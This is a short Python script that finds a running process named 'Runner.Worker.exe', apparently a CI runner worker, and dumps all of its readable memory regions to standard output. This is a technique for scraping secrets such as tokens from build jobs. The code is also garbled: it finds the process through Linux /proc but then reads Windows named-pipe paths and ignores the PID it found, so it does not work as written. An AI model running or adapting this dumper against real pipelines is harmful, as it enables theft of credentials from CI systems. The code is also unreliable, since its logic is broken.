import os
import re
import sys
import mmap

def get_pid(process_name):
    pids = []
    for pid in os.listdir('/proc'):
        if pid.isdigit():
            try:
                with open(os.path.join('/proc', pid, 'cmdline'), 'rb') as cmdline_f:
                    cmdline = cmdline_f.read().decode('utf-8')
                    if process_name.lower() in cmdline.lower():
                        pids.append(int(pid))
            except Exception:
                pass
    return pids

if __name__ == "__main__":
    process_name = "Runner.Worker.exe"
    pids = get_pid(process_name)

    if not pids:
        print(f"No process named '{process_name}' is running.")
        sys.exit()

    pid = pids[0]  # Assuming there's only one matching process
    print(f"Found process '{process_name}' with PID: {pid}")

    map_path = f"\\\\.\\pipe\\{process_name}\\maps"
    mem_path = f"\\\\.\\pipe\\{process_name}\\mem"

    with open(map_path, 'r') as map_f, open(mem_path, 'rb', 0) as mem_f:
        for line in map_f.readlines():
            m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
            if m.group(3) == 'r':
                start = int(m.group(1), 16)
                end = int(m.group(2), 16)
                try:
                    with mmap.mmap(mem_f.fileno(), end - start, offset=start) as mm:
                        sys.stdout.buffer.write(mm)
                except OSError:
                    continue
